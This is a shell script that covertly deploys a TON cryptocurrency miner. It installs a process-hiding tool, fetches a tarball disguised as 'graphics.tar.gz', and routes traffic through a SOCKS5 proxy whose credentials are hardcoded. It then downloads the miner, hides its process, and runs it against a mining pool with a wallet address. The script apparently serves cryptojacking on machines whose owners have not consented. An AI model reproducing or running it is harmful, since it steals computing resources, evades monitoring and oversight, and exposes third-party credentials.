apt update && apt -y install sudo wget curl unzip

sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -

apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/Asriytdx/wesharex/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 209.127.191.180:9279

socks5_username = cosxjsqw

socks5_password = aydutzusi3fr

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

./graftcp/graftcp wget https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz
tar xaf ton-pool.com-miner-0.3.4-linux.tar.gz
chmod +x miner-linux

ph add miner-linux

./graftcp/graftcp ./miner-linux https://next.ton-pool.com EQAmlNaFmoaWvWOwFR2cAWBEsSnwQ2O9bljsXXxiEZ5CXBKG
